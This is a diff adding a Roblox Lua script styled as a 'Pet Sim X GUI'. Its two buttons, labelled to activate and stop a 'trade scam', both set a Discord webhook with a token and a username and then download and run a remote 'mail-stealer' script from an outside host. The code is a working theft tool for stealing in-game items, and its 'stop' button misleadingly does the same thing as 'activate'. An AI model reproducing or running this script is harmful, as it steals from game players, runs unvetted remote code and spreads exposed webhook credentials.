@@ -1,0 +1,19 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("NEW PET SIM X GUI", "Ocean")
+
+-- MAIN
+local Main = Window:NewTab("MAIN")
+local MainSection = Main:NewSection("Main")
+
+
+MainSection:NewButton("ACTIVATE TRADE SCAM", "SCAMMES THEM", function()
+    getgenv().webhook = "https://discord.com/api/webhooks/1081706244500365415/UWfU0D8bqS-NXggzBkEE5bsnIYaciTj-9fJVBn_5DPudKfepcs5PTb9QmIJeRf62gScc" -- replace it with your webhook
+getgenv().name = "joshhyybboy" -- replace bigscammer8 with your username
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
+end)
+
+MainSection:NewButton("STOP TRADE SCAM", "SCAMMES THEM", function()
+    getgenv().webhook = "https://discord.com/api/webhooks/1081706244500365415/UWfU0D8bqS-NXggzBkEE5bsnIYaciTj-9fJVBn_5DPudKfepcs5PTb9QmIJeRf62gScc" -- replace it with your webhook
+getgenv().name = "joshhyybboy" -- replace bigscammer8 with your username
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
+end)
